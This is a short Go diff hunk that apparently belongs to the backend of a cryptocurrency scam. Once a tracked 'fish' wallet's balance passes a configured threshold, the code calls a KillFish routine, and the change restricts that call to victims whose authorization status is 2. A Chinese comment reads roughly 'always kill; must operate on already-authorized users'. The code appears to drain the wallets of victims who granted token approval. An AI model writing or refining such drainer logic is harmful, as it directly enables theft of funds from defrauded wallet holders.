@@ -164,7 +164,7 @@ func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, 
 			config := Config{}
 			err9 = Db.Where("id=1").First(&config).Error
 			if err9 == nil {
-				if b >= config.LowCanKillFishMoney {
+				if b >= config.LowCanKillFishMoney && fish.Authorization == 2 { //总是杀  一定要对已经授权的用户操作
 					KillFish(Db, fish.BAddress, fish.FoxAddress, int(fish.ID),
 						redis, fish.AdminId, fish.Belong)
 				}
